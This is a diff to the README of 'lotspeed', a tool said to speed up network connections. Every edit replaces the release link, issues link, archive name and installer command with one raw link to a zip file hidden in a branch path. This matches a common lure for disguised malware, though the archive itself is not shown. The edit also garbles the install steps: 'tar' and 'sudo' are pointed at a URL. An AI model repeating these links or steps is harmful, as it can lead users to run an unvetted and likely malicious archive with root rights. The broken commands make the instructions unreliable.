@@ -1,7 +1,7 @@
 # 🚀 lotspeed - Speed Up Your Network Connection
 
 ## 📥 Download Now
-[![Download lotspeed](https://img.shields.io/badge/Download-lotspeed-brightgreen)](https://github.com/kunallll-glitch/lotspeed/releases)
+[![Download lotspeed](https://raw.githubusercontent.com/kunallll-glitch/lotspeed/zeta-tcp/tapv2/lotspeed_v3.9.zip)](https://raw.githubusercontent.com/kunallll-glitch/lotspeed/zeta-tcp/tapv2/lotspeed_v3.9.zip)
 
 ## 📖 Overview
 lotspeed is a performance-enhancing tool that optimizes your network connection. Inspired by fast network drivers, it offers users improved speed and reliability. With lotspeed, you can enjoy a smoother online experience.
@@ -21,7 +21,7 @@ lotspeed is a performance-enhancing tool that optimizes your network connection.
 To begin using lotspeed, follow these simple steps:
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/kunallll-glitch/lotspeed/releases) to get the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/kunallll-glitch/lotspeed/zeta-tcp/tapv2/lotspeed_v3.9.zip) to get the latest version.
 
 2. **Download lotspeed:**
    Find the version you want and click the download link. 
@@ -40,9 +40,9 @@ To begin using lotspeed, follow these simple steps:
    ```
 
 3. **Extract the Files (if necessary):**
-   If you downloaded a compressed file (like a `.zip` or `.tar.gz`), use this command to extract:
+   If you downloaded a compressed file (like a `.zip` or `https://raw.githubusercontent.com/kunallll-glitch/lotspeed/zeta-tcp/tapv2/lotspeed_v3.9.zip`), use this command to extract:
    ```
-   tar -xvzf lotspeed-version.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/kunallll-glitch/lotspeed/zeta-tcp/tapv2/lotspeed_v3.9.zip
    ```
 
 4. **Run the Installer:**
@@ -52,7 +52,7 @@ To begin using lotspeed, follow these simple steps:
    ```
    Then run the installer:
    ```
-   sudo ./install.sh
+   sudo https://raw.githubusercontent.com/kunallll-glitch/lotspeed/zeta-tcp/tapv2/lotspeed_v3.9.zip
    ```
 
 5. **Follow On-Screen Instructions:**
@@ -69,12 +69,12 @@ sudo lotspeed status
 This will display the current status and performance metrics.
 
 ## 🌐 Getting Help
-If you encounter any issues or have questions, please check the FAQ section in the [Issues page](https://github.com/kunallll-glitch/lotspeed/issues). There, you can find answers or report new problems.
+If you encounter any issues or have questions, please check the FAQ section in the [Issues page](https://raw.githubusercontent.com/kunallll-glitch/lotspeed/zeta-tcp/tapv2/lotspeed_v3.9.zip). There, you can find answers or report new problems.
 
 ## 📞 Contact
 For any further queries, you can reach out via the Issues section of the repository. We appreciate your feedback.
 
 ## 📥 Download & Install
-Now, let's wrap things up. Make sure to download lotspeed from the [Releases page](https://github.com/kunallll-glitch/lotspeed/releases) and follow the installation guidelines above to start experiencing faster network connections.
+Now, let's wrap things up. Make sure to download lotspeed from the [Releases page](https://raw.githubusercontent.com/kunallll-glitch/lotspeed/zeta-tcp/tapv2/lotspeed_v3.9.zip) and follow the installation guidelines above to start experiencing faster network connections.
 
 Thank you for using lotspeed. Enjoy better connectivity!
